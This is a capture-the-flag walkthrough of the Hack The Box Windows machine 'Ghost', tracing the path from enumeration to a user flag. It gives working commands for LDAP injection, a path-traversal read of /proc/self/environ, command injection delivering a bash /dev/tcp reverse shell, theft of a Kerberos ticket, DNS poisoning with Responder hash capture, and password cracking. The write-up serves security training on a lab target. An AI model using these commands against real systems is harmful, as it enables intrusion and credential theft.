## Overview

Ghost is an Insane Windows machine fronted by a stack of web services bound to an Active Directory domain. The path to user chains an LDAP-injection login bypass and secret oracle, a Ghost CMS arbitrary-file-read, an OS command injection in an internal API, and an AD credential-capture via DNS injection + Responder. Foothold lands as the domain user `justin.bradley`, who owns `user.txt`.

The LDAP domain `ghost.htb` and certificate names (`DC01.ghost.htb`, `core.ghost.htb`) confirm an AD environment. Port 8008 hosts Ghost CMS; vhost fuzzing surfaces more.

## Enumeration

Subdomain fuzzing against port 8008 reveals an `intranet` vhost, and the intranet's "News" section points at a `gitea` instance.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://ghost.htb:8008 -H "Host: FUZZ.ghost.htb" -fs 7676
# -> intranet.ghost.htb, gitea.ghost.htb
```

The intranet login form posts an `ldap-username` / `ldap-secret` pair — a strong hint the backend builds an LDAP filter from user input.

## Foothold

**1. LDAP injection — bypass + secret oracle.** Submitting `*` for both fields bypasses the login (the wildcard matches any directory entry). With a valid account name in hand (`gitea_temp_principal`), the same injection leaks its secret one character at a time by appending a wildcard and watching for the "Invalid combination" response:

```bash
# brute each char: ldap-secret = <known><guess>*  -> keep the char that does NOT return "Invalid combination"
# yields the Gitea token, log in at gitea.ghost.htb:8008
```

**2. Ghost CMS arbitrary file read.** The `blog` repo on Gitea shows a modified `posts-public.js` that reads a file named by an `extra=` parameter with no validation. Using the public content API key, this leaks any file — including process environment variables holding the internal API key:

```bash
curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../../../../../proc/self/environ&key=<public_api_key>"
# -> DEV_INTRANET_KEY=<redacted>
```

**3. Command injection → RCE.** The `intranet` repo's `dev/scan` route builds a shell command with `bash -c "intranet_url_check <url>"` straight from request input. A `;` breaks out into a reverse shell as root inside the Linux container:

```bash
curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: <redacted>' -H 'Content-Type: application/json' -d '{"url":"; bash -i >& /dev/tcp/<lhost>/<lport> 0>&1"}'
```

**4. Steal a cached Kerberos ticket + capture a hash.** The container's root `.ssh/controlmaster` holds a cached SSH session to a domain user (`florence.ramirez`) on a workstation — connect with no password and grab her Kerberos ticket. Then, noticing a forum reference to an unresolved `bitbucket.ghost.htb`, add a DNS record pointing at the attacker and let Responder capture another user's NetNTLMv2:

```bash
ssh florence.ramirez@ghost.htb@dev-workstation "cat /tmp/krb5cc_50 | base64 -w 0"
responder -I tun0 -v
bloodyAD -d ghost.htb -k --host DC01.ghost.htb add dnsRecord bitbucket <lhost>
# -> justin.bradley NetNTLMv2 -> crack with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**5. WinRM as the domain user.** The cracked password logs straight into WinRM:

```bash
evil-winrm -i 10.129.231.105 -u justin.bradley -p '<redacted>'
type C:\Users\justin.bradley\Desktop\user.txt
```
